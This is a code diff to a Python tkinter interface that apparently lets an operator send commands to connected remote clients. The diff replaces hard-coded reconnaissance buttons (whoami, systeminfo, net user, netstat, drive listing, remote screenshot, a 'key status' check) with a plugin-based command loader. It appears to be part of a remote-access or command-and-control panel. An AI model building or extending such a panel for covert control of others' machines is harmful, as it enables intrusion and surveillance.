@@ -2,6 +2,15 @@ import tkinter as tk
 from tkinter import ttk, scrolledtext
 import datetime
 import json
+import os
+import importlib.util
+import logging
+# To this (using relative import)
+import sys
+sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from commands.command_loader import CommandLoader
+
+logger = logging.getLogger(__name__)
 
 class ClientInteractionUI:
     """Handles the UI components for interactive command execution with clients"""
@@ -23,6 +32,9 @@ class ClientInteractionUI:
         self.command_history = []
         self.command_index = 0
         self.displayed_results = set()  # Track which commands have been displayed
+        
+        # Initialize command loader
+        self.command_loader = CommandLoader()
         
         self.create_widgets()
         
@@ -129,45 +141,85 @@ class ClientInteractionUI:
         # Bind selection event to view result
         self.history_tree.bind("<ButtonRelease-1>", self.on_history_select)
         
-        # Quick commands frame
-        quick_cmd_frame = ttk.LabelFrame(self.main_frame, text="Quick Commands")
-        quick_cmd_frame.pack(fill=tk.X, padx=5, pady=5)
+        # Create commands notebook with subtabs
+        self.create_command_subtabs()
+    
+    def create_command_subtabs(self):
+        """Create subtabs for categorized commands"""
+        # Create notebook and container
+        commands_frame = ttk.LabelFrame(self.main_frame, text="Command Categories")
+        commands_frame.pack(fill=tk.X, padx=5, pady=5)
         
-        # Row 1 of quick commands
-        row1_frame = ttk.Frame(quick_cmd_frame)
-        row1_frame.pack(fill=tk.X, padx=5, pady=5)
+        self.commands_notebook = ttk.Notebook(commands_frame)
+        self.commands_notebook.pack(fill=tk.X, padx=5, pady=5)
         
-        ttk.Button(row1_frame, text="whoami", width=15, command=lambda: self.send_command("whoami")).pack(side=tk.LEFT, padx=5)
-        ttk.Button(row1_frame, text="systeminfo", width=15, command=lambda: self.send_command("systeminfo")).pack(side=tk.LEFT, padx=5)
-        ttk.Button(row1_frame, text="ipconfig", width=15, command=lambda: self.send_command("ipconfig /all")).pack(side=tk.LEFT, padx=5)
-        ttk.Button(row1_frame, text="tasklist", width=15, command=lambda: self.send_command("tasklist")).pack(side=tk.LEFT, padx=5)
+        # Load categories from command loader
+        categories = self.command_loader.get_categories()
         
-        # Row 2 of quick commands
-        row2_frame = ttk.Frame(quick_cmd_frame)
-        row2_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
-        
-        ttk.Button(row2_frame, text="netstat", width=15, command=lambda: self.send_command("netstat -ano")).pack(side=tk.LEFT, padx=5)
-        ttk.Button(row2_frame, text="get users", width=15, command=lambda: self.send_command("net user")).pack(side=tk.LEFT, padx=5)
-        ttk.Button(row2_frame, text="get drives", width=15, command=lambda: self.send_command("wmic logicaldisk get deviceid, volumename, description")).pack(side=tk.LEFT, padx=5)
-        ttk.Button(row2_frame, text="screenshot", width=15, command=lambda: self.send_command("screenshot", command_type="screenshot")).pack(side=tk.LEFT, padx=5)
-        
-        # Row 3 of quick commands - Add key management commands
-        row3_frame = ttk.Frame(quick_cmd_frame)
-        row3_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
-        
-        ttk.Button(row3_frame, text="Key Status", width=15, 
-                  command=lambda: self.send_command("echo 'Checking key status...'", command_type="key_status")).pack(side=tk.LEFT, padx=5)
-        
-        ttk.Button(row3_frame, text="Client Info", width=15,
-                  command=lambda: self.send_command("Get-SystemIdentification", command_type="system_info")).pack(side=tk.LEFT, padx=5)
-                  
-        # Add a clear all pending commands button
-        ttk.Button(row3_frame, text="Clear Pending", width=15,
-                  command=self.clear_pending_commands).pack(side=tk.LEFT, padx=5)
-                  
-        # Add a reconnect button that refreshes the connection
-        ttk.Button(row3_frame, text="Reconnect", width=15,
-                  command=self.reconnect_client).pack(side=tk.LEFT, padx=5)
+        # Create a tab for each category
+        for category in categories:
+            tab_frame = ttk.Frame(self.commands_notebook)
+            self.commands_notebook.add(tab_frame, text=category.capitalize())
+            
+            # Get commands for this category
+            commands = self.command_loader.get_commands(category)
+            
+            # Skip empty categories
+            if not commands:
+                empty_label = ttk.Label(tab_frame, text=f"No commands found in '{category}' category")
+                empty_label.pack(padx=10, pady=10)
+                continue
+            
+            # Create button grid - up to 4 buttons per row
+            row_frame = None
+            for i, (cmd_name, cmd_info) in enumerate(commands.items()):
+                # Create a new row frame every 4 buttons
+                if i % 4 == 0:
+                    row_frame = ttk.Frame(tab_frame)
+                    row_frame.pack(fill=tk.X, padx=5, pady=2)
+                
+                # Create button with tooltip (description)
+                display_name = cmd_name.replace('_', ' ').title()
+                
+                # Command execution function
+                def make_command_func(cat=category, cmd=cmd_name):
+                    return lambda: self.command_loader.execute_command(cat, cmd, self, self.client_id)
+                
+                cmd_button = ttk.Button(
+                    row_frame,
+                    text=display_name,
+                    width=15,
+                    command=make_command_func()
+                )
+                cmd_button.pack(side=tk.LEFT, padx=5, pady=2)
+                
+                # Add tooltip with description if available
+                if cmd_info['description']:
+                    self.create_tooltip(cmd_button, cmd_info['description'])
+    
+    def create_tooltip(self, widget, text):
+        """Create a simple tooltip for a widget"""
+        def enter(event):
+            x, y, _, _ = widget.bbox("insert")
+            x += widget.winfo_rootx() + 25
+            y += widget.winfo_rooty() + 20
+            
+            # Create a toplevel window
+            self.tooltip = tk.Toplevel(widget)
+            self.tooltip.wm_overrideredirect(True)
+            self.tooltip.wm_geometry(f"+{x}+{y}")
+            
+            label = ttk.Label(self.tooltip, text=text, wraplength=250,
+                              background="#ffffe0", relief="solid", borderwidth=1,
+                              font=("tahoma", "8", "normal"))
+            label.pack(ipadx=3, ipady=2)
+            
+        def leave(event):
+            if hasattr(self, "tooltip"):
+                self.tooltip.destroy()
+                
+        widget.bind("<Enter>", enter)
+        widget.bind("<Leave>", leave)
     
     def update_key_status(self):
         """Update the key status indicator based on client manager info"""
